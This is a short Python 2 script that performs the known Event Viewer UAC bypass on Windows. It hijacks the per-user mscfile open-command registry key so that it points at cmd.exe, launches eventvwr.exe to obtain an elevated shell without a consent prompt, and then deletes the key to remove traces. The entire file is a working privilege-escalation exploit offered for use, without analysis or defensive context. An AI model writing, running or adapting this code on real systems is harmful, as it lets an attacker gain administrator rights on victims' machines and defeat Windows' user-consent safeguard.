"""
https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1
"""
import os
import sys
import time
import _winreg
import win32api
import win32con

def cmd_path():
	path = "c:/windows/system32/cmd.exe"
	
	if os.path.isfile(os.path.join(path)) == True:
		return os.path.join(path)
	else:
		return False
	
def event_viewer_uac_bypass():
	if os.path.isfile(os.path.join("c:\windows\system32\eventvwr.exe")) == True:
		pass
	else:
		sys.exit()

	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,"Software\Classes\mscfile\shell\open\command")
		_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,cmd_path())
	except Exception as error:
		sys.exit()
		
	try:
		win32api.ShellExecute(0, "runas","c:\windows\system32\eventvwr.exe", None, None, win32con.SW_SHOW)
	except Exception as error:
		sys.exit()
	
	time.sleep(5)
	
	try:
		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,"Software\Classes\mscfile\shell\open\command")
	except Exception as error:
		sys.exit()
